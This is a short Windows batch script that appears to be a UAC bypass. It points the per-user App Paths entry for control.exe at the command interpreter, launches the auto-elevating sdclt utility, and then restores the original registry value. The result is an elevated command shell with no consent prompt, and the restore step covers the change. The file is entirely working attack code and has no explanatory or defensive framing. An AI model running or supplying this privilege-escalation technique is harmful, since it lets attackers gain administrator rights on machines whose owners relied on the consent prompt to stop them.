@echo off

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /t REG_SZ /d %COMSPEC% /f
sdclt
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /t REG_SZ /d %systemroot%\system32\control.exe /f

